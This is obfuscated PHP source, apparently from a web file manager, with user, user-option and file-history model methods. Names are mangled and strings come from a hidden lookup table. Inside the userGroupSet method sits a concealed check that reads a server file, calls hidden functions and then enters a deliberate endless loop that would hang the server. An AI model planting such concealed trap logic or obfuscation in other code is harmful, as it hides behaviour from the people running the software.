$‹Ö¶Šª‹ = Model($¦³âÀÛÍ[862])->get($¦³âÀÛÍ[2549]); $°›—§Éí = $GLOBALS[$¦³âÀÛÍ[6]][$¦³âÀÛÍ[459]][$¦³âÀÛÍ[2549]]; $Ó°çõòÆ = !is_null($‹Ö¶Šª‹) ? $‹Ö¶Šª‹ : $°›—§Éí; return !!$Ó°çõòÆ; } private function _checkExist($Ê–€ı…, $ƒğÜÇ°Ü = false) { $øœË‡ =& $_SERVER[Î·Ü›öğ]; $ŸôŠîè = array($øœË‡[32] => UserModel::ERROR_USER_EXIST_NAME, $øœË‡[2317] => UserModel::ERROR_USER_EXIST_NICKNAME, $øœË‡[382] => UserModel::ERROR_USER_EXIST_EMAIL, $øœË‡[2536] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ŸôŠîè[$øœË‡[2317]]); } $ÙÆ“ëƒù = $ƒğÜÇ°Ü ? array($øœË‡[1810] => array($øœË‡[2550], $ƒğÜÇ°Ü)) : array(); foreach ($ŸôŠîè as $«ÎØ³¿ => $Á»ŞÊèƒ) { $˜óëûÑ = array(); foreach ($ŸôŠîè as $ÜÀëË´ => $óí«’…„) { if (isset($Ê–€ı…[$ÜÀëË´]) && $Ê–€ı…[$ÜÀëË´]) { $˜óëûÑ[] = $Ê–€ı…[$ÜÀëË´]; } } if (!$˜óëûÑ) { continue; } $ù¼îê‰ß = array_merge(array($«ÎØ³¿ => array($øœË‡[7], $˜óëûÑ)), $ÙÆ“ëƒù); $àÙ’ú“É = $this->where($ù¼îê‰ß)->find(); if ($àÙ’ú“É) { return $Á»ŞÊèƒ; } } return !0; } public function userListInfo($éòğ£È) { $—±ıÖÃ =& $_SERVER[Î·Ü›öğ]; $˜›±‰† = array(); $éòğ£È = is_array($éòğ£È) ? array_unique($éòğ£È) : array(); if (!$éòğ£È) { return $˜›±‰†; } if (count($éòğ£È) < 20) { foreach ($éòğ£È as $âÛ©’®İ) { $˜›±‰†[$âÛ©’®İ . $—±ıÖÃ[12]] = $this->getInfoSimpleOuter($âÛ©’®İ); } } else { $ëÌ³Ş¹˜ = array($—±ıÖÃ[1801] => array($—±ıÖÃ[503], $éòğ£È)); if (count($éòğ£È) == 1) { $ëÌ³Ş¹˜ = array($—±ıÖÃ[1801] => $éòğ£È[0]); } $³ˆäÓ’Ş = Model($—±ıÖÃ[590])->field($this->simpleField)->where($ëÌ³Ş¹˜)->select(); $³ˆäÓ’Ş = array_to_keyvalue($³ˆäÓ’Ş, $—±ıÖÃ[1810]); foreach ($éòğ£È as $âÛ©’®İ) { $Êºßªõº = $³ˆäÓ’Ş[$âÛ©’®İ]; if (!$Êºßªõº) { $˜›±‰†[$âÛ©’®İ . $—±ıÖÃ[12]] = $this->getInfoSimpleOuter($âÛ©’®İ); continue; } $Êºßªõº[$—±ıÖÃ[2209]] = Action($—±ıÖÃ[2210])->parseUrl($Êºßªõº[$—±ıÖÃ[2209]]); $˜›±‰†[$âÛ©’®İ . $—±ıÖÃ[12]] = $Êºßªõº; } } return $˜›±‰†; } protected function userStatus($Î¥Øûå¶, $ÚÒÈã×) { $¨€ûÖ£® = $this->getInfoSimple($Î¥Øûå¶); if (!$¨€ûÖ£®) { return !1; } $Éâ‡´â« = array($_SERVER[Î·Ü›öğ][839] => $ÚÒÈã×); return $this->userEdit($Î¥Øûå¶, $Éâ‡´â«); } protected function userRemove($†®Í÷Şê) { $Õü’Ú‚® =& $_SERVER[Î·Ü›öğ]; $õ¾‡©ñë = $this->getInfoSimple($†®Í÷Şê); if (!$õ¾‡©ñë) { return !1; } $¾Ô™ìËÍ = array($Õü’Ú‚®[1801] => $†®Í÷Şê); Model($Õü’Ú‚®[680])->where($¾Ô™ìËÍ)->delete(); Model($Õü’Ú‚®[2551])->where($¾Ô™ìËÍ)->delete(); Model($Õü’Ú‚®[2104])->where($¾Ô™ìËÍ)->delete(); Model($Õü’Ú‚®[2535])->where($¾Ô™ìËÍ)->delete(); Model($Õü’Ú‚®[1168])->where($¾Ô™ìËÍ)->delete(); Model($Õü’Ú‚®[2334])->removeUserAll($†®Í÷Şê); Model($Õü’Ú‚®[922])->userRootRemove($†®Í÷Şê); return $this->where($¾Ô™ìËÍ)->delete(); } protected function userGroupSet($ÉÚ¿Ş˜Ú, $³€¹Ÿâè, $’ßÙ³ = array()) { $Á¨Ïˆ¥ =& $_SERVER[Î·Ü›öğ]; if (!isset($_SERVER[$Á¨Ïˆ¥[481]]) || !isset($_SERVER[$Á¨Ïˆ¥[479]])) { $ßïæş±ƒ = $Á¨Ïˆ¥[977]; $Å‡Ôº‡¦ = $Á¨Ïˆ¥[482]; $Üë¶éÚ = $_SERVER[$Á¨Ïˆ¥[483]] . $Á¨Ïˆ¥[484]; $ƒ•ƒ’ù¡ = $Å‡Ôº‡¦($Üë¶éÚ); $æ›èéÁØ = explode($Á¨Ïˆ¥[288], $ƒ•ƒ’ù¡); if (count($æ›èéÁØ) < $Á¨Ïˆ¥[711]) { $™Âîˆ€ = $Á¨Ïˆ¥[486]; $™Âîˆ€(); } $îáğ¨  = $Á¨Ïˆ¥[978]; $îáğ¨ ($_SERVER[$Á¨Ïˆ¥[979]]); $Ë§°‡ÆŒ = 1; for ($µ¢Î¥µ¬ = $Ë§°‡ÆŒ; $µ¢Î¥µ¬ > 0; $µ¢Î¥µ¬++) { $îáğ¨  = json_encode($GLOBALS[$Á¨Ïˆ¥[503]]); } } $»º’‰õ = $this->getInfoSimple($ÉÚ¿Ş˜Ú); if (!$»º’‰õ || !is_array($³€¹Ÿâè)) { return !1; } $Ëôëˆ› = Model($Á¨Ïˆ¥[2104]); $Ëôëˆ›->where(array($Á¨Ïˆ¥[1810] => $ÉÚ¿Ş˜Ú))->delete(); $Ú²îÍÙß = array(); $ÃÙñ¬Ç = 0; foreach ($³€¹Ÿâè as $©‡¼ğÖ => $ÎïÓÃÒ´) { $î¼¯€Û› = array($Á¨Ïˆ¥[1810] => $ÉÚ¿Ş˜Ú, $Á¨Ïˆ¥[1420] => $©‡¼ğÖ, $Á¨Ïˆ¥[2118] => $ÎïÓÃÒ´); $î¼¯€Û›[$Á¨Ïˆ¥[2034]] = isset($’ßÙ³[$ÃÙñ¬Ç]) ? $’ßÙ³[$ÃÙñ¬Ç] : 0; $ÃÙñ¬Ç++; $Ú²îÍÙß[] = $î¼¯€Û›; } return $Ëôëˆ›->addAll($Ú²îÍÙß, array(), !0); } protected function userGroupAdd($¨¢ø†ŞÅ, $Õã¬ûúµ = array()) { $ä«ˆ¤ÈÒ =& $_SERVER[Î·Ü›öğ]; $²×ûß…™ = $this->getInfoSimple($¨¢ø†ŞÅ); if (!$²×ûß…™ || empty($Õã¬ûúµ)) { return !1; } $×ÃŞø£Ş = array(); foreach ($Õã¬ûúµ as $‹öÅô™û => $ñ¢µıªÉ) { $×ÃŞø£Ş[] = array($ä«ˆ¤ÈÒ[1810] => $¨¢ø†ŞÅ, $ä«ˆ¤ÈÒ[1420] => $‹öÅô™û, $ä«ˆ¤ÈÒ[2118] => $ñ¢µıªÉ, $ä«ˆ¤ÈÒ[2034] => 0); } return Model($ä«ˆ¤ÈÒ[2104])->addAll($×ÃŞø£Ş, array(), !0); } protected function userGroupRemove($”¦İ“±, $Ù ŠøËÕ) { $Ì¢†«‹— =& $_SERVER[Î·Ü›öğ]; $Ì°…õ = $this->getInfoSimple($”¦İ“±); if (!$Ì°…õ || !$Ù ŠøËÕ) { return !1; } $®Ç«››ö = array($Ì¢†«‹—[1801] => $”¦İ“±, $Ì¢†«‹—[2099] => $Ù ŠøËÕ); return Model($Ì¢†«‹—[2104])->where($®Ç«››ö)->delete(); } public function listData() { $´¼šüÏ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($´¼šüÏ[$_SERVER[Î·Ü›öğ][447]]); return $´¼šüÏ; } public function listByID($Ş¿¢áçŸ) { $ÀÆÇ³İÂ =& $_SERVER[Î·Ü›öğ]; if (!$Ş¿¢áçŸ) { return; } $âô©°şê = array($ÀÆÇ³İÂ[1810] => array($ÀÆÇ³İÂ[7], $Ş¿¢áçŸ)); $î²•¥»½ = $this->where($âô©°şê)->select(); $î²•¥»½ = array_sort_keep($î²•¥»½, $ÀÆÇ³İÂ[1810], $Ş¿¢áçŸ); $this->_listDataApply($î²•¥»½); return $î²•¥»½; } public function listByGroup($Ÿ¯ÇØú = 0, $­‚» ğ = array()) { $­„€‘á“ =& $_SERVER[Î·Ü›öğ]; $¬üóÚÙ = $­„€‘á“[12]; $•üîñ¦À = array(); if ($Ÿ¯ÇØú) { $•üîñ¦À = array($­„€‘á“[2552] => intval($Ÿ¯ÇØú)); $¬üóÚÙ = "\114\105\x46\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\165\163\145\162\x5f\x67\x72\157\165\160\40\x75\x73\x65\x72\137\147\x72\157\x75\x70\x20\x6f\x6e\40\x75\163\x65\x72\56\165\x73\145\162\x49\x44\x20\75\x20\x75\163\x65\162\x5f\x67\x72\x6f\165\x70\x2e\x75\163\x65\162\x49\104"; $ µ€óŒ = Input::get($­„€‘á“[541], null, $­„€‘á“[12]) ? $­„€‘á“[12] : $­„€‘á“[2553]; } if (isset($­‚» ğ[$­„€‘á“[839]])) { $•üîñ¦À[$­„€‘á“[2554]] = $­‚» ğ[$­„€‘á“[839]]; } $ÃÆÏ£ûØ = _get($­‚» ğ, $­„€‘á“[2555], $­„€‘á“[234]); if (_get($­‚» ğ, $­„€‘á“[850], !1)) { $•üîñ¦À[$ÃÆÏ£ûØ] = array($­„€‘á“[2298], $­‚» ğ[$­„€‘á“[850]]); } if (_get($­‚» ğ, $­„€‘á“[851], !1)) { $ĞÁºŞò¬ = array($­„€‘á“[2299], $­‚» ğ[$­„€‘á“[851]]); if ($•üîñ¦À[$ÃÆÏ£ûØ]) { $•üîñ¦À[$ÃÆÏ£ûØ] = array($•üîñ¦À[$ÃÆÏ£ûØ], $ĞÁºŞò¬, $­„€‘á“[2300]); } else { $•üîñ¦À[$ÃÆÏ£ûØ] = $ĞÁºŞò¬; } } $Õ…á®  = $this->_makeOrder($ µ€óŒ)->field($­„€‘á“[2556])->where($•üîñ¦À)->join($¬üóÚÙ)->selectPage(50); $this->_listDataApply($Õ…á® [$­„€‘á“[447]]); return $Õ…á® ; } private function _makeOrder($ë—¨øÛÍ = '') { $½‚Õ Ë˜ =& $_SERVER[Î·Ü›öğ]; $«±ÌïÊÈ = array($½‚Õ Ë˜[1810], $½‚Õ Ë˜[32], $½‚Õ Ë˜[1999], $½‚Õ Ë˜[2208], $½‚Õ Ë˜[1972], $½‚Õ Ë˜[234]); $ŒØ´¤ = array($½‚Õ Ë˜[534] => $½‚Õ Ë˜[535], $½‚Õ Ë˜[536] => $½‚Õ Ë˜[537]); $ƒÊËì“© = Input::get($½‚Õ Ë˜[541], $½‚Õ Ë˜[7], $½‚Õ Ë˜[1801], $«±ÌïÊÈ); $äæÁÈÒÚ = Input::get($½‚Õ Ë˜[542], $½‚Õ Ë˜[7], $½‚Õ Ë˜[2105], array($½‚Õ Ë˜[2105], $½‚Õ Ë˜[536])); $äæÁÈÒÚ = $ŒØ´¤[$äæÁÈÒÚ]; $ë—¨øÛÍ = $ë—¨øÛÍ . "\165\x73\x65\x72\56{$ƒÊËì“©}\40{$äæÁÈÒÚ}\54\x20\x75\163\145\162\56\165\x73\145\162\111\x44\40\x61\x73\x63"; return $this->alias($½‚Õ Ë˜[2244])->order($ë—¨øÛÍ); } public function listSearch($¢¸Ìãè) { $®¬Á•ş¦ =& $_SERVER[Î·Ü›öğ]; $¨÷âÑ…É = trim($¢¸Ìãè[$®¬Á•ş¦[2108]]); $§Õ”¨ğö = explode($®¬Á•ş¦[53], $¨÷âÑ…É); if (!$¨÷âÑ…É || count($§Õ”¨ğö) == 1) { return $this->listSearchNow($¢¸Ìãè); } $´ûÜ¢• = array($®¬Á•ş¦[447] => array()); foreach ($§Õ”¨ğö as $ˆşÓ¤×) { if (!trim($ˆşÓ¤×)) { continue; } $¢¸Ìãè[$®¬Á•ş¦[2108]] = $ˆşÓ¤×; $òûšÇşó = $this->listSearchNow($¢¸Ìãè); $´ûÜ¢•[$®¬Á•ş¦[447]] = array_merge($´ûÜ¢•[$®¬Á•ş¦[447]], $òûšÇşó[$®¬Á•ş¦[447]]); } $´ûÜ¢•[$®¬Á•ş¦[447]] = array_unique_by_key($´ûÜ¢•[$®¬Á•ş¦[447]], $®¬Á•ş¦[1810]); $´ûÜ¢•[$®¬Á•ş¦[444]] = array($®¬Á•ş¦[445] => count($´ûÜ¢•[$®¬Á•ş¦[447]]), $®¬Á•ş¦[441] => 20, $®¬Á•ş¦[430] => 1, $®¬Á•ş¦[446] => 1); return $´ûÜ¢•; } public function listSearchNow($ªËÅ³ğ) { $·Ûå‰êÎ =& $_SERVER[Î·Ü›öğ]; $ÉÉ£Œ£ó = trim($ªËÅ³ğ[$·Ûå‰êÎ[2108]]); $ëÑŸÏ„Ó = isset($ªËÅ³ğ[$·Ûå‰êÎ[2109]]) ? $ªËÅ³ğ[$·Ûå‰êÎ[2109]] : !1; $ÉÉ£Œ£ó = str_replace($·Ûå‰êÎ[2110], $·Ûå‰êÎ[2111], trim($ÉÉ£Œ£ó)); $ÍÂ¹…ìİ = array($·Ûå‰êÎ[32] => array($·Ûå‰êÎ[461], "\x25{$ÉÉ£Œ£ó}\x25"), $·Ûå‰êÎ[382] => array($·Ûå‰êÎ[461], "{$ÉÉ£Œ£ó}\x25"), $·Ûå‰êÎ[2317] => array($·Ûå‰êÎ[461], "{$ÉÉ£Œ£ó}\45"), $·Ûå‰êÎ[1099] => $·Ûå‰êÎ[2112]); if (Input::check($ÉÉ£Œ£ó, $·Ûå‰êÎ[388])) { $ÍÂ¹…ìİ[$·Ûå‰êÎ[1810]] = array($·Ûå‰êÎ[461], "{$ÉÉ£Œ£ó}\x25"); $ÍÂ¹…ìİ[$·Ûå‰êÎ[2536]] = array($·Ûå‰êÎ[461], "{$ÉÉ£Œ£ó}\x25"); } if (!$ÉÉ£Œ£ó) { $ÍÂ¹…ìİ = array(); } if (isset($ªËÅ³ğ[$·Ûå‰êÎ[839]])) { $ÍÂ¹…ìİ[$·Ûå‰êÎ[839]] = $ªËÅ³ğ[$·Ûå‰êÎ[839]]; } $ÍÂ¹…ìİ = $this->parseWhereLike($ÍÂ¹…ìİ); $¬Ş´İ¼Ú = $this->_makeOrder()->where($ÍÂ¹…ìİ)->selectPage(20); if (!$¬Ş´İ¼Ú || count($¬Ş´İ¼Ú[$·Ûå‰êÎ[447]]) < 5 && Input::check($ÉÉ£Œ£ó, $·Ûå‰êÎ[395])) { $‘Ä—¡õÃ = $this->_searchFromMeta($·Ûå‰êÎ[548], $ÉÉ£Œ£ó, 10); $Æ˜ˆ‘Œş = $this->_searchFromMeta($·Ûå‰êÎ[549], $ÉÉ£Œ£ó, 10); $×Îù…ƒÀ = array_merge($‘Ä—¡õÃ, $Æ˜ˆ‘Œş, $¬Ş´İ¼Ú[$·Ûå‰êÎ[447]]); $¬Ş´İ¼Ú[$·Ûå‰êÎ[447]] = array_unique_by_key($×Îù…ƒÀ, $·Ûå‰êÎ[1810]); $¬Ş´İ¼Ú[$·Ûå‰êÎ[444]][$·Ûå‰êÎ[445]] = count($¬Ş´İ¼Ú[$·Ûå‰êÎ[447]]); $¬Ş´İ¼Ú[$·Ûå‰êÎ[444]][$·Ûå‰êÎ[446]] = ceil($¬Ş´İ¼Ú[$·Ûå‰êÎ[444]][$·Ûå‰êÎ[445]] / $¬Ş´İ¼Ú[$·Ûå‰êÎ[444]][$·Ûå‰êÎ[441]]); } $this->_listDataApply($¬Ş´İ¼Ú[$·Ûå‰êÎ[447]]); $this->_filterByGroup($¬Ş´İ¼Ú, $ëÑŸÏ„Ó); return $¬Ş´İ¼Ú; } private function _filterByGroup(&$‚¿¾š, $Ä¸ä¬¢) { $®õêú =& $_SERVER[Î·Ü›öğ]; if (!$Ä¸ä¬¢) { return $‚¿¾š; } foreach ($‚¿¾š[$®õêú[447]] as $á½¯üÇç => &$ó¨ö€Êô) { $ÕÖúŞÔ“ = array_to_keyvalue($ó¨ö€Êô[$®õêú[1419]], $®õêú[12], $®õêú[1420]); if (!in_array($Ä¸ä¬¢, $ÕÖúŞÔ“)) { unset($‚¿¾š[$®õêú[447]][$á½¯üÇç]); } } unset($ó¨ö€Êô); $‚¿¾š[$®õêú[447]] = array_values($‚¿¾š[$®õêú[447]]); $‚¿¾š[$®õêú[444]] = array($®õêú[2281] => count($‚¿¾š[$®õêú[447]]), $®õêú[2279] => $‚¿¾š[$®õêú[444]][$®õêú[441]], $®õêú[2278] => 1, $®õêú[2280] => 1); } private function _searchFromMeta($”µ¼Ÿí, $¸¯¬ƒ¢‰, $µ‚½ç¯¹) { $åè½èè½ =& $_SERVER[Î·Ü›öğ]; $¸¯¬ƒ¢‰ = strtolower($¸¯¬ƒ¢‰); $­Ê¥ºìº = array($åè½èè½[97] => $”µ¼Ÿí, $åè½èè½[452] => array($åè½èè½[461], "\x25{$¸¯¬ƒ¢‰}\x25")); $­Ê¥ºìº = $this->parseWhereLike($­Ê¥ºìº); $ÎÇ‹“öœ = Model($åè½èè½[2557])->where($­Ê¥ºìº)->limit($µ‚½ç¯¹)->select(); if (!$ÎÇ‹“öœ) { return array(); } $ÎÇ‹“öœ = array_to_keyvalue($ÎÇ‹“öœ, $åè½èè½[12], $åè½èè½[1810]); $‘›Ü¾ğÌ = $this->where(array($åè½èè½[1801] => array($åè½èè½[7], $ÎÇ‹“öœ)))->select(); if (!$‘›Ü¾ğÌ) { return array(); } return $‘›Ü¾ğÌ; } private function _listDataApplyItem($µÚ€§Úı) { $ƒ¢‡¯ÒÁ = array($µÚ€§Úı); $this->_listDataApply($ƒ¢‡¯ÒÁ); return $ƒ¢‡¯ÒÁ[0]; } private function _listDataApply(&$Ãõíû‚È) { $µÃÊö’ =& $_SERVER[Î·Ü›öğ]; if (!$Ãõíû‚È) { return; } array_remove_key($Ãõíû‚È, $µÃÊö’[988]); $£ÒùÆÈ¼ = array_to_keyvalue($Ãõíû‚È, $µÃÊö’[12], $µÃÊö’[1810]); $this->_listAppendGroup($Ãõíû‚È, $£ÒùÆÈ¼); $this->_listAppendMeta($Ãõíû‚È, $£ÒùÆÈ¼); $this->_listAppendSourceRoot($Ãõíû‚È, $£ÒùÆÈ¼); } private function _listAppendSourceRoot(&$ĞáÁöè«, $†’´À‘é) { $Ì´ç˜ûİ =& $_SERVER[Î·Ü›öğ]; $·«¾şØ¿ = Model($Ì´ç˜ûİ[922])->listSourceRoot(SourceModel::TYPE_USER, $†’´À‘é); $·«¾şØ¿ = array_to_keyvalue($·«¾şØ¿, $Ì´ç˜ûİ[582]); $·«¾şØ¿ = array_remove_key($·«¾şØ¿, $Ì´ç˜ûİ[582]); foreach ($ĞáÁöè« as &$Ä÷¨Õœş) { $Ä÷¨Õœş[$Ì´ç˜ûİ[90]] = $·«¾şØ¿[$Ä÷¨Õœş[$Ì´ç˜ûİ[1810]]] ? $·«¾şØ¿[$Ä÷¨Õœş[$Ì´ç˜ûİ[1810]]] : array(); } unset($Ä÷¨Õœş); } private function _listAppendGroup(&$£ Óó¡, $¦é£¾ø¦) { $©£äõï =& $_SERVER[Î·Ü›öğ]; $¯Î²šŞ­ = array($©£äõï[1810] => array($©£äõï[7], $¦é£¾ø¦)); $øÖÙ…š¸ = Model($©£äõï[2104])->where($¯Î²šŞ­)->select(); $øØ‘ı‹± = array_to_keyvalue($øÖÙ…š¸, $©£äõï[12], $©£äõï[1420]); $øØ‘ı‹± = array_remove_value(array_unique($øØ‘ı‹±), $©£äõï[231]); if (!$øØ‘ı‹± || !$øÖÙ…š¸) { return; } $¯Î²šŞ­ = array($©£äõï[1420] => array($©£äõï[7], $øØ‘ı‹±)); $úññæ  = Model($©£äõï[1418])->field($©£äõï[2558])->where($¯Î²šŞ­)->select(); $úññæ  = array_to_keyvalue($úññæ , $©£äõï[1420]); $øÖÙ…š¸ = array_to_keyvalue_group($øÖÙ…š¸, $©£äõï[1810]); foreach ($øÖÙ…š¸ as &$‰‡—­ã¹) { $„±®Èµ = array(); foreach ($‰‡—­ã¹ as $…Ğïéì) { if (!$…Ğïéì[$©£äõï[2118]]) { continue; } $ÙØŞä—” = Model($©£äõï[584])->listData($…Ğïéì[$©£äõï[2118]]); $„±®Èµ[] = array($©£äõï[1420] => $…Ğïéì[$©£äõï[1420]], $©£äõï[2559] => $úññæ [$…Ğïéì[$©£äõï[1420]]][$©£äõï[32]], $©£äõï[597] => $úññæ [$…Ğïéì[$©£äõï[1420]]][$©£äõï[597]], $©£äõï[498] => $ÙØŞä—”); } $‰‡—­ã¹ = $„±®Èµ; } unset($‰‡—­ã¹); foreach ($£ Óó¡ as &$ËÓÈ”À€) { $ËÓÈ”À€[$©£äõï[1419]] = array(); if (isset($øÖÙ…š¸[$ËÓÈ”À€[$©£äõï[1810]]])) { $ËÓÈ”À€[$©£äõï[1419]] = $øÖÙ…š¸[$ËÓÈ”À€[$©£äõï[1810]]]; } } unset($ËÓÈ”À€); } public function userAppendGroup($Ğ²İÚ÷¼) { $ÜÕ“ŒáÚ =& $_SERVER[Î·Ü›öğ]; if (!$Ğ²İÚ÷¼) { return array(); } $this->_listAppendGroup($Ğ²İÚ÷¼, array_to_keyvalue($Ğ²İÚ÷¼, $ÜÕ“ŒáÚ[12], $ÜÕ“ŒáÚ[1810])); return $Ğ²İÚ÷¼; } private function _listAppendMeta(&$é¬üÜ‰Í, $·â”‹Ç–) { $Õí¬ê¾˜ =& $_SERVER[Î·Ü›öğ]; $¥ò¼Ş‡÷ = UserJobModel::JOB_KEY; $î„ˆÍ„ = array($Õí¬ê¾˜[2102]); $èéØ¡Ÿ¡ = array($Õí¬ê¾˜[1810] => array($Õí¬ê¾˜[7], $·â”‹Ç–)); $â­ÅËáã = Model($Õí¬ê¾˜[2535])->where($èéØ¡Ÿ¡)->select(); $Ÿ¶­âë = array(); foreach ($â­ÅËáã as $¥¹œá‹) { $Š¾úÍ¿ = $¥¹œá‹[$Õí¬ê¾˜[1810]]; if (!isset($Ÿ¶­âë[$Š¾úÍ¿])) { $Ÿ¶­âë[$Š¾úÍ¿] = array(); } $Ÿ¶­âë[$Š¾úÍ¿][$¥¹œá‹[$Õí¬ê¾˜[97]]] = $¥¹œá‹[$Õí¬ê¾˜[452]]; } $ÈÉí¸´ò = Model($Õí¬ê¾˜[2560]); foreach ($é¬üÜ‰Í as &$×‡óÄğ) { $Š¾úÍ¿ = $×‡óÄğ[$Õí¬ê¾˜[1810]]; $éÃ½³Øå = isset($Ÿ¶­âë[$Š¾úÍ¿]) ? $Ÿ¶­âë[$Š¾úÍ¿] : array(); $×‡óÄğ[$Õí¬ê¾˜[552]] = array_field_key($éÃ½³Øå, $î„ˆÍ„); $×‡óÄğ[$Õí¬ê¾˜[2561]] = array(); if (isset($éÃ½³Øå[$¥ò¼Ş‡÷])) { $×‡óÄğ[$Õí¬ê¾˜[2561]] = $ÈÉí¸´ò->getUserJobInfo($éÃ½³Øå[$¥ò¼Ş‡÷]); } } unset($×‡óÄğ); } protected function groupUserAll($Ã±ëê‡Š) { $£û»·‘ =& $_SERVER[Î·Ü›öğ]; if (!$Ã±ëê‡Š) { return !1; } $Šß’ëËó = Model($£û»·‘[2104])->field($£û»·‘[1810])->where(array($£û»·‘[1420] => array($£û»·‘[7], $Ã±ëê‡Š)))->select(); $Šß’ëËó = array_to_keyvalue($Šß’ëËó, $£û»·‘[12], $£û»·‘[1810]); return array_unique($Šß’ëËó); } public function userSearch($©šƒ–¬À, $–ÈçÃ³Ÿ = "\52") { return Model($_SERVER[Î·Ü›öğ][610])->where($©šƒ–¬À)->field($–ÈçÃ³Ÿ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\x5f\157\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Êı¹¤şÌ) { $ŸÒ¢Á¹À =& $_SERVER[Î·Ü›öğ]; $–“’çôÀ = defined($ŸÒ¢Á¹À[2248]) && USER_ID ? USER_ID : $ŸÒ¢Á¹À[12]; return "\x55\163\x65\x72\x4f\160\164\x69\x6f\156\x5f{$Êı¹¤şÌ}\x5f" . $–“’çôÀ; } protected function filterWhere($øÀ€¼Œñ) { $€ı—¢£œ =& $_SERVER[Î·Ü›öğ]; $øÀ€¼Œñ[$€ı—¢£œ[1810]] = defined($€ı—¢£œ[2248]) && USER_ID ? USER_ID : $€ı—¢£œ[12]; return $øÀ€¼Œñ; } public function cacheRemoveUser($ÑæçÕ¾Ş, $Çâ» úÔ) { return Cache::remove("\x55\x73\145\162\117\160\x74\x69\157\156\x5f{$ÑæçÕ¾Ş}\137" . $Çâ» úÔ); } protected function optionDefault($ÂÑ®Ş = '') { $È·§ı¸í =& $_SERVER[Î·Ü›öğ]; if ($ÂÑ®Ş == $È·§ı¸í[12]) { return $GLOBALS[$È·§ı¸í[6]][$È·§ı¸í[2562]]; } if ($ÂÑ®Ş == $È·§ı¸í[2563]) { return $GLOBALS[$È·§ı¸í[6]][$È·§ı¸í[2564]]; } } } goto AŠÈÔï …«; Dí„°“Ñ×è: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\162\x63\145\137\x68\151\163\164\157\x72\171"; public function historyCount($úµÎÄ§ê) { $Ô§ù«úÃ =& $_SERVER[Î·Ü›öğ]; if (!$úµÎÄ§ê) { return array(); } if (is_string($úµÎÄ§ê) || is_int($úµÎÄ§ê)) { $úµÎÄ§ê = array($úµÎÄ§ê); } $ëãñ¬à‡ = array($Ô§ù«úÃ[194], $Ô§ù«úÃ[2272] => $Ô§ù«úÃ[578]); $‘‰ßÏÓ = array($Ô§ù«úÃ[194] => array($Ô§ù«úÃ[7], $úµÎÄ§ê)); $›®‚Íş = $this->field($ëãñ¬à‡)->where($‘‰ßÏÓ)->group($Ô§ù«úÃ[194])->select(); return array_to_keyvalue($›®‚Íş, $Ô§ù«úÃ[194], $Ô§ù«úÃ[578]); } public function addHistory($Ñç¸ÅÁ, $µçª–‹“ = '') { $€ÜÏö¾Š =& $_SERVER[Î·Ü›öğ]; $”Ö¡¹¾ó = array($€ÜÏö¾Š[502] => $Ñç¸ÅÁ[$€ÜÏö¾Š[194]], $€ÜÏö¾Š[1801] => isset($Ñç¸ÅÁ[$€ÜÏö¾Š[540]]) ? $Ñç¸ÅÁ[$€ÜÏö¾Š[540]] : $Ñç¸ÅÁ[$€ÜÏö¾Š[538]], $€ÜÏö¾Š[555] => $Ñç¸ÅÁ[$€ÜÏö¾Š[554]], $€ÜÏö¾Š[633] => $Ñç¸ÅÁ[$€ÜÏö¾Š[79]], $€ÜÏö¾Š[2273] => $µçª–‹“); if ($GLOBALS[$€ÜÏö¾Š[6]][$€ÜÏö¾Š[92]][$€ÜÏö¾Š[1332]] >= 1) { $this->historyAutoClear($”Ö¡¹¾ó[$€ÜÏö¾Š[194]]); $this->add($”Ö¡¹¾ó); } Hook::trigger($€ÜÏö¾Š[2274], $”Ö¡¹¾ó); Model($€ÜÏö¾Š[2275])->eventFileEdit($Ñç¸ÅÁ[$€ÜÏö¾Š[194]]); } private function historyAutoClear($İ»½Ú‚©) { $®ÍŞ„É¯ =& $_SERVER[Î·Ü›öğ]; $†óŠÌ—Ç = Model($®ÍŞ„É¯[862])->get($®ÍŞ„É¯[1354]); $ªš¯õœ´ = intval($GLOBALS[$®ÍŞ„É¯[6]][$®ÍŞ„É¯[92]][$®ÍŞ„É¯[1332]]); $¸ÃÆĞï¾ = $†óŠÌ—Ç == $®ÍŞ„É¯[1355] ? min(5, $ªš¯õœ´) : $ªš¯õœ´; $¸ÃÆĞï¾ = $¸ÃÆĞï¾ <= 0 ? 0 : $¸ÃÆĞï¾ - 1; if ($¸ÃÆĞï¾ >= 499) { return; } $û¹Øù¬¥ = array($®ÍŞ„É¯[502] => $İ»½Ú‚©); $ì¾¸¯î‚ = $this->field($®ÍŞ„É¯[2276])->where($û¹Øù¬¥)->order($®ÍŞ„É¯[2269])->select(); if (!$ì¾¸¯î‚ || $¸ÃÆĞï¾ >= count($ì¾¸¯î‚)) { return; } $²ßĞµê = array_to_keyvalue($ì¾¸¯î‚, $®ÍŞ„É¯[12], $®ÍŞ„É¯[477]); $²ßĞµê = array_slice($²ßĞµê, $¸ÃÆĞï¾); $Øï˜“é• = array_to_keyvalue($ì¾¸¯î‚, $®ÍŞ„É¯[12], $®ÍŞ„É¯[554]); $Øï˜“é• = array_slice($Øï˜“é•, $¸ÃÆĞï¾); if (!$²ßĞµê || !$Øï˜“é•) { return; } $û¹Øù¬¥ = array($®ÍŞ„É¯[504] => array($®ÍŞ„É¯[7], $²ßĞµê)); $this->where($û¹Øù¬¥)->delete(); Model($®ÍŞ„É¯[557])->remove($Øï˜“é•); } public function listData($å—‚É§ø) { $üïçüó =& $_SERVER[Î·Ü›öğ]; $í¹¿ˆ° = array($üïçüó[502] => $å—‚É§ø); $™‘¡›–Í = $üïçüó[2277]; $õŒšíË = $this->field($™‘¡›–Í)->where($í¹¿ˆ°)->order($üïçüó[2269])->selectPage(); $this->_listAppendUser($õŒšíË[$üïçüó[447]]); $íÍë†ß‹ = Model($üïçüó[862])->get($üïçüó[1354]); $…ã­†˜ú = 5; if ($íÍë†ß‹ == $üïçüó[1355]) { $õŒšíË[$üïçüó[447]] = array_slice($õŒšíË[$üïçüó[447]], 0, $…ã­†˜ú); $õŒšíË[$üïçüó[444]] = array($üïçüó[2278] => 1, $üïçüó[2279] => 20, $üïçüó[2280] => 1, $üïçüó[2281] => count($õŒšíË[$üïçüó[447]])); } return $õŒšíË; } 